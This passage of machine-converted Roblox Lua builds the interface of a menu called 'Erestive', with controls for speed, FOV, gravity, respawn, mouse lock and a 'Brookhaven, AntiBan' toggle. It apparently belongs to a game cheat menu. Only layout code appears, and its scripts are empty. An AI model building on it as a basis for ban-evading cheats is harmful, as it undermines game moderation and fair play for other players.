G2L["150"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["150"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["150"]["Text"] = [[ ]];
G2L["150"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Speed.FOV.FOVConfig.SetFOV.Button.LocalScript
G2L["151"] = Instance.new("LocalScript", G2L["150"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Speed.FOV.FOVConfig.SetFOV.Button.Animations
G2L["152"] = Instance.new("LocalScript", G2L["150"]);
G2L["152"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Speed.FOV.FOVConfig.SetFOV.Text
G2L["153"] = Instance.new("TextLabel", G2L["14c"]);
G2L["153"]["TextWrapped"] = true;
G2L["153"]["ZIndex"] = 9;
G2L["153"]["TextSize"] = 14;
G2L["153"]["TextScaled"] = true;
G2L["153"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["153"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["153"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["153"]["BackgroundTransparency"] = 1;
G2L["153"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["153"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["153"]["Text"] = [[Set Speed]];
G2L["153"]["Name"] = [[Text]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Speed.FOV.FOVConfig.SetFOV.UIGradient
G2L["154"] = Instance.new("UIGradient", G2L["14c"]);
G2L["154"]["Rotation"] = -90;
G2L["154"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Speed.FOV.UIGradient
G2L["155"] = Instance.new("UIGradient", G2L["144"]);
G2L["155"]["Rotation"] = -90;
G2L["155"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.ResetButton
G2L["156"] = Instance.new("TextButton", G2L["a7"]);
G2L["156"]["TextWrapped"] = true;
G2L["156"]["TextColor3"] = Color3.fromRGB(52, 52, 52);
G2L["156"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["156"]["BackgroundTransparency"] = 1;
G2L["156"]["AutomaticSize"] = Enum.AutomaticSize.X;
G2L["156"]["Size"] = UDim2.new(0, 65, 0, 64);
G2L["156"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["156"]["Text"] = [[]];
G2L["156"]["Name"] = [[ResetButton]];
G2L["156"]["Position"] = UDim2.new(0, 14, 0, 261);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.ResetButton.Script
G2L["157"] = Instance.new("Script", G2L["156"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.ResetButton.ScriptReset
G2L["158"] = Instance.new("Script", G2L["156"]);
G2L["158"]["Name"] = [[ScriptReset]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.ResetButton.UICorner
G2L["159"] = Instance.new("UICorner", G2L["156"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.ResetButton.ImageLabel
G2L["15a"] = Instance.new("ImageLabel", G2L["156"]);
G2L["15a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["15a"]["Image"] = [[rbxassetid://12787168857]];
G2L["15a"]["Size"] = UDim2.new(0, 40, 0, 39);
G2L["15a"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["15a"]["BackgroundTransparency"] = 1;
G2L["15a"]["Position"] = UDim2.new(0.04062, 0, 0.05348, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.ResetButton.TextLabel
G2L["15b"] = Instance.new("TextLabel", G2L["156"]);
G2L["15b"]["TextWrapped"] = true;
G2L["15b"]["TextSize"] = 14;
G2L["15b"]["TextScaled"] = true;
G2L["15b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15b"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["15b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15b"]["BackgroundTransparency"] = 1;
G2L["15b"]["Size"] = UDim2.new(0.71927, 0, 1, 0);
G2L["15b"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["15b"]["Text"] = [[Respawn]];
G2L["15b"]["Position"] = UDim2.new(-0, 0, 0, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.ResetButton.TextLabel.UIStroke
G2L["15c"] = Instance.new("UIStroke", G2L["15b"]);
G2L["15c"]["Transparency"] = 0.79;
G2L["15c"]["LineJoinMode"] = Enum.LineJoinMode.Bevel;
G2L["15c"]["Thickness"] = 1.8;
G2L["15c"]["Color"] = Color3.fromRGB(219, 219, 219);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.ResetButton.UIListLayout
G2L["15d"] = Instance.new("UIListLayout", G2L["156"]);
G2L["15d"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["15d"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.BrAntiBan
G2L["15e"] = Instance.new("Frame", G2L["a7"]);
G2L["15e"]["BorderSizePixel"] = 0;
G2L["15e"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["15e"]["Size"] = UDim2.new(0.96172, 0, 0.07267, 0);
G2L["15e"]["Position"] = UDim2.new(-0.09649, 0, 0.01746, 0);
G2L["15e"]["Name"] = [[BrAntiBan]];
G2L["15e"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.BrAntiBan.WhiteBar
G2L["15f"] = Instance.new("Frame", G2L["15e"]);
G2L["15f"]["BorderSizePixel"] = 0;
G2L["15f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15f"]["Size"] = UDim2.new(0, 1, 0.706, 0);
G2L["15f"]["Position"] = UDim2.new(0.18955, 0, 0.14243, 0);
G2L["15f"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["15f"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.BrAntiBan.WhiteBar.UIGradient
G2L["160"] = Instance.new("UIGradient", G2L["15f"]);
G2L["160"]["Rotation"] = 90;
G2L["160"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.BrAntiBan.Slider
G2L["161"] = Instance.new("Frame", G2L["15e"]);
G2L["161"]["BorderSizePixel"] = 0;
G2L["161"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["161"]["Size"] = UDim2.new(0.16373, 0, 0.731, 0);
G2L["161"]["Position"] = UDim2.new(0.80655, 0, 0.11724, 0);
G2L["161"]["Name"] = [[Slider]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.BrAntiBan.Slider.Animations
G2L["162"] = Instance.new("LocalScript", G2L["161"]);
G2L["162"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.BrAntiBan.Slider.Animations.Sample
G2L["163"] = Instance.new("ImageLabel", G2L["162"]);
G2L["163"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["163"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["163"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["163"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["163"]["BackgroundTransparency"] = 1;
G2L["163"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.BrAntiBan.Slider.UICorner
G2L["164"] = Instance.new("UICorner", G2L["161"]);
G2L["164"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.BrAntiBan.Slider.Button
G2L["165"] = Instance.new("TextButton", G2L["161"]);
G2L["165"]["TextWrapped"] = true;
G2L["165"]["TextSize"] = 14;
G2L["165"]["TextScaled"] = true;
G2L["165"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["165"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["165"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["165"]["ZIndex"] = 2;
G2L["165"]["BackgroundTransparency"] = 1;
G2L["165"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["165"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["165"]["Text"] = [[YES]];
G2L["165"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.BrAntiBan.Slider.Button.LocalScript
G2L["166"] = Instance.new("LocalScript", G2L["165"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.BrAntiBan.Slider.UIGradient
G2L["167"] = Instance.new("UIGradient", G2L["161"]);
G2L["167"]["Rotation"] = -90;
G2L["167"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.BrAntiBan.OnOrOff
G2L["168"] = Instance.new("TextLabel", G2L["15e"]);
G2L["168"]["TextWrapped"] = true;
G2L["168"]["ZIndex"] = 2;
G2L["168"]["TextSize"] = 14;
G2L["168"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["168"]["TextScaled"] = true;
G2L["168"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["168"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["168"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["168"]["BackgroundTransparency"] = 1;
G2L["168"]["Size"] = UDim2.new(0.57116, 0, 0.5158, 0);
G2L["168"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["168"]["Text"] = [[Brookhaven, AntiBan]];
G2L["168"]["Name"] = [[OnOrOff]];
G2L["168"]["Position"] = UDim2.new(0.21475, 0, 0.2225, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.BrAntiBan.UICorner
G2L["169"] = Instance.new("UICorner", G2L["15e"]);
G2L["169"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.BrAntiBan.UIGradient
G2L["16a"] = Instance.new("UIGradient", G2L["15e"]);
G2L["16a"]["Rotation"] = -90;
G2L["16a"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.BrAntiBan.ImageLabel
G2L["16b"] = Instance.new("ImageLabel", G2L["15e"]);
G2L["16b"]["BorderSizePixel"] = 0;
G2L["16b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["16b"]["Image"] = [[rbxassetid://15011030819]];
G2L["16b"]["Size"] = UDim2.new(0, 40, 0, 40);
G2L["16b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16b"]["BackgroundTransparency"] = 1;
G2L["16b"]["Position"] = UDim2.new(0.03913, 0, 0, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame
G2L["16c"] = Instance.new("Frame", G2L["a7"]);
G2L["16c"]["BorderSizePixel"] = 0;
G2L["16c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16c"]["Size"] = UDim2.new(0, 333, 0, 100);
G2L["16c"]["Position"] = UDim2.new(0, 0, 0.30916, 0);
G2L["16c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16c"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.UIListLayout
G2L["16d"] = Instance.new("UIListLayout", G2L["16c"]);
G2L["16d"]["Padding"] = UDim.new(0, 10);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night
G2L["16e"] = Instance.new("Frame", G2L["16c"]);
G2L["16e"]["BorderSizePixel"] = 0;
G2L["16e"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["16e"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["16e"]["Position"] = UDim2.new(0, 0, 0.14243, 0);
G2L["16e"]["Name"] = [[night]];
G2L["16e"]["BackgroundTransparency"] = 0.85;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.Text
G2L["16f"] = Instance.new("TextLabel", G2L["16e"]);
G2L["16f"]["TextWrapped"] = true;
G2L["16f"]["ZIndex"] = 9;
G2L["16f"]["TextSize"] = 14;
G2L["16f"]["TextScaled"] = true;
G2L["16f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16f"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["16f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16f"]["BackgroundTransparency"] = 1;
G2L["16f"]["Size"] = UDim2.new(0.34652, 0, 0.5158, 0);
G2L["16f"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["16f"]["Text"] = [[MouseLock]];
G2L["16f"]["Name"] = [[Text]];
G2L["16f"]["Position"] = UDim2.new(0.03554, 0, 0.23836, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.WhiteBar
G2L["170"] = Instance.new("Frame", G2L["16e"]);
G2L["170"]["BorderSizePixel"] = 0;
G2L["170"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["170"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["170"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["170"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["170"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.WhiteBar.UIGradient
G2L["171"] = Instance.new("UIGradient", G2L["170"]);
G2L["171"]["Rotation"] = 90;
G2L["171"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.UICorner
G2L["172"] = Instance.new("UICorner", G2L["16e"]);
G2L["172"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig
G2L["173"] = Instance.new("Frame", G2L["16e"]);
G2L["173"]["BorderSizePixel"] = 0;
G2L["173"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["173"]["Size"] = UDim2.new(0.5183, 0, 0.81331, 0);
G2L["173"]["Position"] = UDim2.new(0.45456, 0, 0.09064, 0);
G2L["173"]["Name"] = [[FOVConfig]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.UICorner
G2L["174"] = Instance.new("UICorner", G2L["173"]);
G2L["174"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable
G2L["175"] = Instance.new("Frame", G2L["173"]);
G2L["175"]["ZIndex"] = 2;
G2L["175"]["BorderSizePixel"] = 0;
G2L["175"]["BackgroundColor3"] = Color3.fromRGB(0, 43, 6);
G2L["175"]["Size"] = UDim2.new(0, 45, 0, 36);
G2L["175"]["Position"] = UDim2.new(0, 0, -0, 0);
G2L["175"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["175"]["Name"] = [[VisiblEnable]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Animations
G2L["176"] = Instance.new("LocalScript", G2L["175"]);
G2L["176"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Animations.Sample
G2L["177"] = Instance.new("ImageLabel", G2L["176"]);
G2L["177"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["177"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["177"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["177"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["177"]["BackgroundTransparency"] = 1;
G2L["177"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.UICorner
G2L["178"] = Instance.new("UICorner", G2L["175"]);
G2L["178"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Button
G2L["179"] = Instance.new("TextButton", G2L["175"]);
G2L["179"]["TextWrapped"] = true;
G2L["179"]["TextSize"] = 14;
G2L["179"]["TextScaled"] = true;
G2L["179"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["179"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["179"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["179"]["BackgroundTransparency"] = 1;
G2L["179"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["179"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["179"]["Text"] = [[ ]];
G2L["179"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Button.LocalScript
G2L["17a"] = Instance.new("LocalScript", G2L["179"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Text
G2L["17b"] = Instance.new("TextLabel", G2L["175"]);
G2L["17b"]["TextWrapped"] = true;
G2L["17b"]["ZIndex"] = 9;
G2L["17b"]["TextSize"] = 14;
G2L["17b"]["TextScaled"] = true;
G2L["17b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["17b"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["17b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["17b"]["BackgroundTransparency"] = 1;
G2L["17b"]["Size"] = UDim2.new(0.71736, 0, 0.54155, 0);
G2L["17b"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["17b"]["Text"] = [[Visible]];
G2L["17b"]["Name"] = [[Text]];
G2L["17b"]["Position"] = UDim2.new(0.14025, 0, 0.22473, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.UIGradient
G2L["17c"] = Instance.new("UIGradient", G2L["175"]);
G2L["17c"]["Rotation"] = -90;
G2L["17c"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.FOVSet
G2L["17d"] = Instance.new("TextBox", G2L["173"]);
G2L["17d"]["Visible"] = false;
G2L["17d"]["Name"] = [[FOVSet]];
G2L["17d"]["PlaceholderColor3"] = Color3.fromRGB(169, 169, 169);
G2L["17d"]["TextWrapped"] = true;
G2L["17d"]["TextSize"] = 14;
G2L["17d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["17d"]["TextScaled"] = true;
G2L["17d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["17d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["17d"]["PlaceholderText"] = [[16 - classic]];
G2L["17d"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["17d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["17d"]["Text"] = [[]];
G2L["17d"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.UIListLayout
G2L["17e"] = Instance.new("UIListLayout", G2L["173"]);
G2L["17e"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["17e"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable
G2L["17f"] = Instance.new("Frame", G2L["173"]);
G2L["17f"]["ZIndex"] = 2;
G2L["17f"]["BorderSizePixel"] = 0;
G2L["17f"]["BackgroundColor3"] = Color3.fromRGB(43, 0, 0);
G2L["17f"]["Size"] = UDim2.new(0, 45, 0, 36);
G2L["17f"]["Position"] = UDim2.new(0.50773, 0, -0, 0);
G2L["17f"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["17f"]["Name"] = [[VisiblEnable]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Animations
G2L["180"] = Instance.new("LocalScript", G2L["17f"]);
G2L["180"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Animations.Sample
G2L["181"] = Instance.new("ImageLabel", G2L["180"]);
G2L["181"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["181"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["181"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["181"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["181"]["BackgroundTransparency"] = 1;
G2L["181"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.UICorner
G2L["182"] = Instance.new("UICorner", G2L["17f"]);
G2L["182"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Button
G2L["183"] = Instance.new("TextButton", G2L["17f"]);
G2L["183"]["TextWrapped"] = true;
G2L["183"]["TextSize"] = 14;
G2L["183"]["TextScaled"] = true;
G2L["183"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["183"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["183"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["183"]["BackgroundTransparency"] = 1;
G2L["183"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["183"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["183"]["Text"] = [[ ]];
G2L["183"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Button.LocalScript
G2L["184"] = Instance.new("LocalScript", G2L["183"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Text
G2L["185"] = Instance.new("TextLabel", G2L["17f"]);
G2L["185"]["TextWrapped"] = true;
G2L["185"]["ZIndex"] = 9;
G2L["185"]["TextSize"] = 14;
G2L["185"]["TextScaled"] = true;
G2L["185"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["185"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["185"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["185"]["BackgroundTransparency"] = 1;
G2L["185"]["Size"] = UDim2.new(0.71736, 0, 0.54155, 0);
G2L["185"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["185"]["Text"] = [[Visible]];
G2L["185"]["Name"] = [[Text]];
G2L["185"]["Position"] = UDim2.new(0.14025, 0, 0.22473, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.UIGradient
G2L["186"] = Instance.new("UIGradient", G2L["17f"]);
G2L["186"]["Rotation"] = -90;
G2L["186"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.UIGradient
G2L["187"] = Instance.new("UIGradient", G2L["16e"]);
G2L["187"]["Rotation"] = -90;
G2L["187"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Gravity
G2L["188"] = Instance.new("Frame", G2L["a7"]);
G2L["188"]["BorderSizePixel"] = 0;
G2L["188"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["188"]["Size"] = UDim2.new(0, 333, 0, 100);
G2L["188"]["Position"] = UDim2.new(0, 0, 0.30916, 0);
G2L["188"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["188"]["Name"] = [[Gravity]];
G2L["188"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Gravity.UIListLayout
G2L["189"] = Instance.new("UIListLayout", G2L["188"]);
G2L["189"]["Padding"] = UDim.new(0, 10);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Gravity.FOV
G2L["18a"] = Instance.new("Frame", G2L["188"]);
G2L["18a"]["BorderSizePixel"] = 0;
G2L["18a"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["18a"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["18a"]["Position"] = UDim2.new(0, 0, -0, 0);
G2L["18a"]["Name"] = [[FOV]];
G2L["18a"]["BackgroundTransparency"] = 0.85;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Gravity.FOV.Text
G2L["18b"] = Instance.new("TextLabel", G2L["18a"]);
G2L["18b"]["TextWrapped"] = true;
G2L["18b"]["ZIndex"] = 9;
G2L["18b"]["TextSize"] = 14;
G2L["18b"]["TextScaled"] = true;
G2L["18b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18b"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["18b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18b"]["BackgroundTransparency"] = 1;
G2L["18b"]["Size"] = UDim2.new(0.34652, 0, 0.5158, 0);
G2L["18b"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["18b"]["Text"] = [[Gravity]];
G2L["18b"]["Name"] = [[Text]];
G2L["18b"]["Position"] = UDim2.new(0.03554, 0, 0.23836, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Gravity.FOV.WhiteBar
G2L["18c"] = Instance.new("Frame", G2L["18a"]);
G2L["18c"]["BorderSizePixel"] = 0;
G2L["18c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18c"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["18c"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["18c"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["18c"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Gravity.FOV.WhiteBar.UIGradient
G2L["18d"] = Instance.new("UIGradient", G2L["18c"]);
G2L["18d"]["Rotation"] = 90;
G2L["18d"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Gravity.FOV.UICorner
G2L["18e"] = Instance.new("UICorner", G2L["18a"]);
G2L["18e"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Gravity.FOV.FOVConfig
G2L["18f"] = Instance.new("Frame", G2L["18a"]);
G2L["18f"]["BorderSizePixel"] = 0;
